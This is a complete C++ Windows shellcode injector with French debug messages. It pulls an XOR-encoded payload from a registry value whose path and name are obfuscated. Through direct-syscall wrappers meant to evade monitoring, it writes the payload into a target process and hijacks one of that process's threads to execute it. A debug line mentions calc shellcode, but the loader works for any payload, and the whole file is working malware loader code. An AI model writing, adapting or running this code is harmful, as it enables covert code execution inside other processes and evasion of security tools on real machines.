#include <Windows.h>
#include <TlHelp32.h>
#include <winreg.h>
#include <cstdio>
#include <cstdlib>
#include "syscalls.h"

#pragma comment(lib, "Advapi32.lib")

#define STR_MASK   0x5D
#define BLOB_MASK  0x6B

#define DBG(...) printf(__VA_ARGS__)

static const unsigned char s_path[] = {
    0x0E,0x32,0x3B,0x29,0x2A,0x3C,0x2F,0x38,0x01,0x01,
    0x10,0x3C,0x3E,0x2F,0x32,0x30,0x38,0x39,0x34,0x3C,
    0x01,0x01,0x1B,0x31,0x3C,0x2E,0x35,0x0D,0x31,0x3C,
    0x24,0x38,0x2F, 0x00
};
static const unsigned char s_val[] = {
    0x1E,0x32,0x33,0x3B,0x34,0x3A, 0x00
};

static void UnmaskStr(const unsigned char* src, char* dst) {
    while (*src) *dst++ = (char)(*src++ ^ STR_MASK);
    *dst = '\0';
}

static DWORD LocateTargetThread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) { DBG("[-] Snap fail\n"); return 0; }
    THREADENTRY32 te; ZeroMemory(&te, sizeof(te)); te.dwSize = sizeof(te);
    DWORD found = 0;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) { found = te.th32ThreadID; break; }
            te.dwSize = sizeof(te);
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return found;
}

static unsigned char* FetchBlob(SIZE_T* outLen) {
    *outLen = 0;
    char keyPath[64] = {0}, keyVal[16] = {0};
    UnmaskStr(s_path, keyPath);
    UnmaskStr(s_val, keyVal);
    DBG("[*] Key path = %s\\%s\n", keyPath, keyVal);

    HKEY hk = NULL;
    LSTATUS ls = RegOpenKeyExA(HKEY_CURRENT_USER, keyPath, 0, KEY_READ, &hk);
    if (ls != ERROR_SUCCESS) { DBG("[-] RegOpenKeyExA = %ld\n", ls); return NULL; }

    DWORD sz = 0;
    ls = RegQueryValueExA(hk, keyVal, NULL, NULL, NULL, &sz);
    if (ls != ERROR_SUCCESS || sz == 0) { DBG("[-] RegQuery size = %ld (sz=%lu)\n", ls, sz); RegCloseKey(hk); return NULL; }

    unsigned char* buf = (unsigned char*)malloc(sz);
    if (!buf) { RegCloseKey(hk); return NULL; }
    ls = RegQueryValueExA(hk, keyVal, NULL, NULL, buf, &sz);
    RegCloseKey(hk);
    if (ls != ERROR_SUCCESS) { DBG("[-] RegQuery data = %ld\n", ls); free(buf); return NULL; }

    DBG("[+] Payload lue: %lu octets\n", sz);
    for (DWORD i = 0; i < sz; ++i) buf[i] ^= BLOB_MASK;
    DBG("[+] Premier octet decode: 0x%02X (attendu 0xFC pour calc shellcode)\n", buf[0]);
    *outLen = sz;
    return buf;
}

int main(int argc, char* argv[]) {
    DBG("[*] PID cible: %s\n", argc >= 2 ? argv[1] : "(aucun)");
    if (argc < 2) { printf("Usage: %s <PID>\n", argv[0]); return 1; }
    DWORD pid = (DWORD)atoi(argv[1]);

    SIZE_T blobLen = 0;
    unsigned char* blob = FetchBlob(&blobLen);
    if (!blob || blobLen == 0) { DBG("[-] FetchBlob fail\n"); return 1; }

    HANDLE hProc = NULL, hThr = NULL;
    PVOID  rBuf  = NULL;
    SIZE_T written = 0;
    ULONG  oldProt = 0, suspCount = 0;
    SIZE_T region = blobLen;

    CLIENT_ID cid; ZeroMemory(&cid, sizeof(cid));
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

    NTSTATUS st = Qn3_NtOpenProcess(
        &hProc,
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        &oa, &cid);
    DBG("[*] NtOpenProcess = 0x%08lX, handle=%p\n", st, hProc);
    if (st != 0 || !hProc) goto cleanup;

    DWORD tid = LocateTargetThread(pid);
    DBG("[*] TID = %lu\n", tid);
    if (tid == 0) goto cleanup;
    cid.UniqueThread = (HANDLE)(ULONG_PTR)tid;

    st = Qn3_NtOpenThread(&hThr,
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
        &oa, &cid);
    DBG("[*] NtOpenThread = 0x%08lX, handle=%p\n", st, hThr);
    if (st != 0 || !hThr) goto cleanup;

    st = Qn3_NtAllocateVirtualMemory(hProc, &rBuf, 0, &region,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DBG("[*] NtAllocate = 0x%08lX, addr=%p (taille=%zu)\n", st, rBuf, region);
    if (st != 0 || !rBuf) goto cleanup;

    st = Qn3_NtWriteVirtualMemory(hProc, rBuf, blob, blobLen, &written);
    DBG("[*] NtWrite = 0x%08lX, ecrit=%zu\n", st, written);
    if (st != 0) goto cleanup;

    SecureZeroMemory(blob, blobLen); free(blob); blob = NULL;

    st = Qn3_NtProtectVirtualMemory(hProc, &rBuf, &region, PAGE_EXECUTE_READ, &oldProt);
    DBG("[*] NtProtect = 0x%08lX, old=0x%lX\n", st, oldProt);
    if (st != 0) goto cleanup;

    st = Qn3_NtSuspendThread(hThr, &suspCount);
    DBG("[*] NtSuspend = 0x%08lX, count=%lu\n", st, suspCount);
    if (st != 0) goto cleanup;

    {
        CONTEXT ctx; ZeroMemory(&ctx, sizeof(ctx));
        ctx.ContextFlags = CONTEXT_FULL;
        st = Qn3_NtGetContextThread(hThr, &ctx);
        DBG("[*] NtGetContext = 0x%08lX, RIP=0x%p\n", st, (PVOID)ctx.Rip);
        if (st != 0) { Qn3_NtResumeThread(hThr, NULL); goto cleanup; }

        ctx.Rip = (DWORD64)rBuf;
        ctx.Rsp = (ctx.Rsp & ~0xFULL) - 8;
        st = Qn3_NtSetContextThread(hThr, &ctx);
        DBG("[*] NtSetContext = 0x%08lX, nouveau RIP=0x%p\n", st, rBuf);
        if (st != 0) { Qn3_NtResumeThread(hThr, NULL); goto cleanup; }

        st = Qn3_NtResumeThread(hThr, NULL);
        DBG("[*] NtResume = 0x%08lX\n", st);
        DBG("[+] Injection terminee. Shellcode devrait s'executer.\n");
    }

cleanup:
    if (blob) { SecureZeroMemory(blob, blobLen); free(blob); }
    if (hThr)  Qn3_NtClose(hThr);
    if (hProc) Qn3_NtClose(hProc);
    return 0;
}
